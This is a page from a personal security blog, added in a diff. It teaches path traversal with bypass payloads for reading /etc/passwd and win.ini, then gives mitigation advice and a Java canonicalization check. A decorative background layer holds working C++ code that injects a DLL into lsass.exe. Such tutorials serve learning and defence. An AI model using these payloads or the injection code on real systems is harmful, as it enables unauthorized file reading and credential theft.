@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Path Traversal (Directory Traversal)</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Path Traversal (Directory Traversal)" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" >CTF Writeups</a>
+                <a href="/notes/" class="active">Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Path Traversal (Directory Traversal)</h1>
+            
+            <p class="post-meta">Published: May 8, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: web-security, portswigger, path-traversal, file-inclusion</p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <blockquote>
+  <p><strong>Path traversal</strong> (also known as directory traversal) is a vulnerability that enables an attacker to read arbitrary files on the server that is running an application.</p>
+</blockquote>
+
+<p>This might include:</p>
+<ul>
+  <li><strong>Application code and data:</strong> Source code, configuration files, SQLite databases.</li>
+  <li><strong>Credentials for back-end systems:</strong> Passwords, API keys, database connection strings.</li>
+  <li><strong>Sensitive operating system files:</strong> <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, <code class="language-plaintext highlighter-rouge">C:\Windows\win.ini</code>.</li>
+</ul>
+
+<p>In some critical cases, an attacker might be able to <em>write</em> to arbitrary files on the server, modifying application data or behavior, which can ultimately lead to full server compromise.</p>
+
+<hr />
+
+<h2 id="the-core-vulnerability">The Core Vulnerability</h2>
+
+<p>Imagine an application that loads an image using a URL parameter:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/loadImage?filename=218.png"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Under the hood, the application might append this parameter to a base directory:
+<code class="language-plaintext highlighter-rouge">/var/www/images/</code> + <code class="language-plaintext highlighter-rouge">218.png</code> = <code class="language-plaintext highlighter-rouge">/var/www/images/218.png</code></p>
+
+<p>If the application implements <strong>no defenses</strong>, an attacker can manipulate the <code class="language-plaintext highlighter-rouge">filename</code> parameter using <code class="language-plaintext highlighter-rouge">../</code> (dot-dot-slash) sequences to escape the base directory:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://insecure-website.com/loadImage?filename=../../../etc/passwd
+</code></pre></div></div>
+
+<p>The sequence <code class="language-plaintext highlighter-rouge">../</code> steps up one level in the directory structure. Three consecutive <code class="language-plaintext highlighter-rouge">../</code> sequences step up from <code class="language-plaintext highlighter-rouge">/var/www/images/</code> to the filesystem root (<code class="language-plaintext highlighter-rouge">/</code>), effectively reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<blockquote>
+  <p><strong>Note on Windows Environments:</strong>
+Both <code class="language-plaintext highlighter-rouge">../</code> and <code class="language-plaintext highlighter-rouge">..\</code> are valid directory traversal sequences on Windows.
+Example: <code class="language-plaintext highlighter-rouge">https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</code></p>
+</blockquote>
+
+<hr />
+
+<h2 id="bypassing-common-defenses">Bypassing Common Defenses</h2>
+
+<p>Many applications attempt to sanitize user input to prevent path traversal, but these defenses can often be bypassed. Here are common obstacles and how to circumvent them:</p>
+
+<h3 id="1-absolute-paths">1. Absolute Paths</h3>
+<p>If an application simply strips or blocks directory traversal sequences (<code class="language-plaintext highlighter-rouge">../</code>), you might be able to bypass it by using an absolute path directly from the filesystem root.</p>
+
+<ul>
+  <li><strong>Payload:</strong> <code class="language-plaintext highlighter-rouge">filename=/etc/passwd</code></li>
+</ul>
+
+<h3 id="2-nested-traversal-sequences">2. Nested Traversal Sequences</h3>
+<p>If the application strips <code class="language-plaintext highlighter-rouge">../</code> non-recursively, you can nest the sequences. When the inner sequence is stripped, the outer characters form a new traversal sequence.</p>
+
+<ul>
+  <li><strong>Payload:</strong> <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
+  <li><strong>Example:</strong> <code class="language-plaintext highlighter-rouge">....//....//....//etc/passwd</code> becomes <code class="language-plaintext highlighter-rouge">../../../etc/passwd</code> after stripping.</li>
+</ul>
+
+<h3 id="3-url-encoding">3. URL Encoding</h3>
+<p>Web application firewalls (WAFs) or the web server itself may block explicit <code class="language-plaintext highlighter-rouge">../</code> strings. You can sometimes bypass this sanitization by URL encoding, or double URL encoding, the characters.</p>
+
+<ul>
+  <li><strong>Standard URL encoding:</strong> <code class="language-plaintext highlighter-rouge">%2e%2e%2f</code></li>
+  <li><strong>Double URL encoding:</strong> <code class="language-plaintext highlighter-rouge">%252e%252e%252f</code></li>
+  <li><strong>Non-standard Unicode encodings:</strong> <code class="language-plaintext highlighter-rouge">..%c0%af</code> or <code class="language-plaintext highlighter-rouge">..%ef%bc%8f</code></li>
+</ul>
+
+<h3 id="4-required-base-folder-bypass">4. Required Base Folder Bypass</h3>
+<p>An application may require the user-supplied filename to explicitly <em>start</em> with the expected base folder (e.g., <code class="language-plaintext highlighter-rouge">/var/www/images</code>). You can satisfy this requirement and then traverse out of it.</p>
+
+<ul>
+  <li><strong>Payload:</strong> <code class="language-plaintext highlighter-rouge">filename=/var/www/images/../../../etc/passwd</code></li>
+</ul>
+
+<h3 id="5-null-byte-bypass-file-extension-validation">5. Null Byte Bypass (File Extension Validation)</h3>
+<p>An application may require the user-supplied filename to <em>end</em> with an expected file extension (e.g., <code class="language-plaintext highlighter-rouge">.png</code>). You can use a null byte (<code class="language-plaintext highlighter-rouge">%00</code>) to terminate the file path before the required extension, tricking the validation logic while making the filesystem API ignore everything after the null byte.</p>
+
+<ul>
+  <li><strong>Payload:</strong> <code class="language-plaintext highlighter-rouge">filename=../../../etc/passwd%00.png</code></li>
+</ul>
+
+<hr />
+
+<h2 id="prevention--mitigation">Prevention &amp; Mitigation</h2>
+
+<p>The most effective way to prevent path traversal vulnerabilities is to <strong>avoid passing user-supplied input to filesystem APIs altogether.</strong></p>
+
+<p>If you <em>must</em> pass user-supplied input to filesystem APIs, use a robust, two-layered defense strategy:</p>
+
+<ol>
+  <li><strong>Validate User Input (Allow-listing):</strong> Compare the user input with a strict allow-list of permitted values. If that isn’t possible, verify that the input contains <em>only</em> permitted content (e.g., strictly alphanumeric characters).</li>
+  <li><strong>Path Canonicalization:</strong> Append the input to the base directory and use a platform filesystem API to canonicalize the resulting path. Verify that the canonicalized path starts securely with the expected base directory.</li>
+</ol>
+
+<h3 id="secure-implementation-example-java">Secure Implementation Example (Java)</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. Combine base directory with user input</span>
+<span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="no">BASE_DIRECTORY</span><span class="o">,</span> <span class="n">userInput</span><span class="o">);</span>
+
+<span class="c1">// 2. Canonicalize and verify the final path</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">getCanonicalPath</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="no">BASE_DIRECTORY</span><span class="o">))</span> <span class="o">{</span>
+    <span class="c1">// Path is safe. Process file...</span>
+<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+    <span class="c1">// Path traversal attempt detected! Reject request.</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
